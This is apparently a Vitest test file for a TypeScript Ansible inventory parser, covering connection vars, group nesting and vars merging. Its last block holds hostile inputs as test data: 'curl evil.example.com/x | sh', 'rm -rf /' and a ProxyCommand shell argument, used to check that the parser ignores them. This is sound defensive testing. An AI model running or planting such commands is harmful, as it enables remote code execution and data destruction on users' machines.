import { describe, it, expect } from 'vitest'
import { parse } from 'yaml'
import { parseAnsibleInventory, varsToAuth, groupId, hostId } from './ansible'

const SRC = 'src1'

describe('varsToAuth', () => {
  it('maps the connection vars we understand', () => {
    expect(
      varsToAuth({ ansible_user: 'deploy', ansible_port: 2222 })
    ).toEqual({ username: 'deploy', port: 2222 })
  })

  it('accepts the ansible_ssh_* aliases', () => {
    expect(varsToAuth({ ansible_ssh_user: 'root', ansible_ssh_port: '2200' })).toEqual({
      username: 'root',
      port: 2200
    })
  })

  it('infers key auth from a stated key file', () => {
    expect(varsToAuth({ ansible_ssh_private_key_file: '/k/id' })).toEqual({
      privateKeyPath: '/k/id',
      authMethod: 'privateKey'
    })
  })

  it('sets nothing for unrelated or blank vars', () => {
    expect(varsToAuth({ some_var: 'x', ansible_user: '   ' })).toEqual({})
  })
})

describe('parseAnsibleInventory', () => {
  const doc = parse(`
all:
  children:
    web:
      hosts:
        web1:
          ansible_host: 10.0.0.1
        web2: {}
      vars:
        ansible_user: nginx
    db:
      hosts:
        db1:
          ansible_host: 10.0.0.9
          ansible_user: postgres
          ansible_port: 2222
`)

  it('builds a group per Ansible group, nested under all', () => {
    const { groups } = parseAnsibleInventory(doc, SRC)
    expect(groups.map((g) => g.name)).toEqual(['all', 'web', 'db'])
    expect(groups.find((g) => g.name === 'web')!.parentId).toBe(groupId(SRC, 'all'))
  })

  it('puts group vars on the group, so hosts inherit them', () => {
    const { groups } = parseAnsibleInventory(doc, SRC)
    expect(groups.find((g) => g.name === 'web')!.username).toBe('nginx')
  })

  it('reads ansible_host, falling back to the host key', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'web1')!.host).toBe('10.0.0.1')
    expect(hosts.find((h) => h.name === 'web2')!.host).toBe('web2')
  })

  it('leaves host auth unset when the inventory says nothing, so it inherits', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'web1')!.username).toBeUndefined()
  })

  it('keeps host-level overrides', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    const db1 = hosts.find((h) => h.name === 'db1')!
    expect(db1.username).toBe('postgres')
    expect(db1.port).toBe(2222)
  })

  it('gives hosts stable ids derived from the source', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'db1')!.id).toBe(hostId(SRC, 'db1'))
  })

  it('merges group_vars and host_vars, with inline vars winning', () => {
    const lookup = (kind: 'group' | 'host', name: string): Record<string, unknown> => {
      if (kind === 'group' && name === 'web') return { ansible_user: 'from-group-vars' }
      if (kind === 'host' && name === 'db1') return { ansible_user: 'from-host-vars' }
      return {}
    }
    const { groups, hosts } = parseAnsibleInventory(doc, SRC, lookup)
    // Inline `vars:` beats group_vars, as in Ansible.
    expect(groups.find((g) => g.name === 'web')!.username).toBe('nginx')
    // db1 states its own user inline, so host_vars loses too.
    expect(hosts.find((h) => h.name === 'db1')!.username).toBe('postgres')
  })

  it('applies host_vars when the inventory states nothing inline', () => {
    // web2 declares no vars of its own, unlike web1 which sets ansible_host.
    const lookup = (kind: 'group' | 'host', name: string): Record<string, unknown> =>
      kind === 'host' && name === 'web2' ? { ansible_host: '192.168.1.5' } : {}
    const { hosts } = parseAnsibleInventory(doc, SRC, lookup)
    expect(hosts.find((h) => h.name === 'web2')!.host).toBe('192.168.1.5')
  })

  it('keeps a host listed twice as one host, belonging to both groups', () => {
    const dup = parse(`
all:
  children:
    a:
      hosts:
        shared: {}
    b:
      hosts:
        shared: {}
`)
    const { hosts, memberships } = parseAnsibleInventory(dup, SRC)
    expect(hosts).toHaveLength(1)
    expect(memberships[hostId(SRC, 'shared')]).toEqual([
      groupId(SRC, 'all/a'),
      groupId(SRC, 'all/b')
    ])
    // Same depth, so the alphabetically last group supplies the settings —
    // which is the one Ansible's own merge order would let win.
    expect(hosts[0].groupId).toBe(groupId(SRC, 'all/b'))
  })

  it('handles top-level groups without an "all" wrapper', () => {
    const flat = parse('web:\n  hosts:\n    w1: {}\n')
    const { groups, hosts } = parseAnsibleInventory(flat, SRC)
    expect(groups.map((g) => g.name)).toEqual(['web'])
    expect(hosts.map((h) => h.name)).toEqual(['w1'])
  })

  it('tolerates empty and null sections', () => {
    const sparse = parse('all:\n  children:\n    empty:\n')
    expect(() => parseAnsibleInventory(sparse, SRC)).not.toThrow()
    expect(parseAnsibleInventory(sparse, SRC).hosts).toEqual([])
  })

  it('returns nothing for a non-object document', () => {
    const empty = { groups: [], hosts: [], memberships: {} }
    expect(parseAnsibleInventory(null, SRC)).toEqual(empty)
    expect(parseAnsibleInventory('text', SRC)).toEqual(empty)
  })
})

describe('a host in several groups', () => {
  // The shape that started this: web2 is named by both web and db.
  const doc = parse(`
all:
  children:
    linux:
      children:
        web:
          hosts:
            web1:
              ansible_host: 10.10.10.245
            web2:
              ansible_host: 10.10.10.15
        db:
          hosts:
            db1:
              ansible_host: 10.10.10.13
              ansible_port: 22
            web2:
              ansible_host: 10.10.10.15
      vars:
        ansible_user: max
`)

  it('keeps one host entity, not one per mention', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.map((h) => h.name).sort()).toEqual(['db1', 'web1', 'web2'])
  })

  it('records every group that names it', () => {
    const { memberships } = parseAnsibleInventory(doc, SRC)
    expect(memberships[hostId(SRC, 'web2')]).toEqual([
      groupId(SRC, 'all/linux/db'),
      groupId(SRC, 'all/linux/web')
    ])
  })

  it('lists a host named once under that group alone', () => {
    const { memberships } = parseAnsibleInventory(doc, SRC)
    expect(memberships[hostId(SRC, 'web1')]).toEqual([groupId(SRC, 'all/linux/web')])
    expect(memberships[hostId(SRC, 'db1')]).toEqual([groupId(SRC, 'all/linux/db')])
  })

  it('inherits from the last group in Ansible order, alphabetically within a level', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    // db and web sit at the same depth, so 'web' is read last and wins.
    expect(hosts.find((h) => h.name === 'web2')?.groupId).toBe(groupId(SRC, 'all/linux/web'))
  })

  it('prefers a deeper group over a shallower one', () => {
    const nested = parse(`
all:
  hosts:
    solo:
      ansible_host: 10.0.0.1
  children:
    zone:
      hosts:
        solo:
          ansible_host: 10.0.0.1
`)
    const { hosts, memberships } = parseAnsibleInventory(nested, SRC)
    expect(memberships[hostId(SRC, 'solo')]).toEqual([groupId(SRC, 'all'), groupId(SRC, 'all/zone')])
    expect(hosts.find((h) => h.name === 'solo')?.groupId).toBe(groupId(SRC, 'all/zone'))
  })

  it('merges inline vars across mentions, the later one winning', () => {
    const conflicting = parse(`
all:
  children:
    aaa:
      hosts:
        node:
          ansible_host: 10.0.0.1
          ansible_port: 22
    bbb:
      hosts:
        node:
          ansible_host: 10.0.0.99
`)
    const { hosts } = parseAnsibleInventory(conflicting, SRC)
    const node = hosts.find((h) => h.name === 'node')
    expect(node?.host).toBe('10.0.0.99')
    // Only bbb restates the address, so the port from aaa survives the merge.
    expect(node?.port).toBe(22)
  })
})

describe('what an inventory may not set', () => {
  /**
   * onConnectCommand is arbitrary code run on every connection. Honouring it
   * from a repository would give anyone able to commit there command execution
   * on every machine its readers open. The parser must never populate it, no
   * matter what the YAML says — this test is the guard on that.
   */
  it('never populates onConnectCommand, whatever the vars are called', () => {
    const hostile = parse(`
all:
  vars:
    onConnectCommand: "curl evil.example.com/x | sh"
    ansible_onConnectCommand: "curl evil.example.com/x | sh"
    on_connect_command: "curl evil.example.com/x | sh"
    ansible_shell_command: "curl evil.example.com/x | sh"
  children:
    web:
      vars:
        onConnectCommand: "rm -rf /"
      hosts:
        w1:
          ansible_host: 10.0.0.1
          onConnectCommand: "rm -rf /"
          ansible_ssh_extra_args: "-o ProxyCommand=sh"
`)
    const { groups, hosts } = parseAnsibleInventory(hostile, SRC)
    for (const item of [...groups, ...hosts]) {
      expect(item.onConnectCommand).toBeUndefined()
    }
  })

  it('maps only the connection vars it knows, ignoring the rest', () => {
    expect(
      varsToAuth({
        ansible_user: 'deploy',
        onConnectCommand: 'sudo -i',
        ansible_become: true,
        ansible_python_interpreter: '/usr/bin/python3'
      })
    ).toEqual({ username: 'deploy' })
  })
})

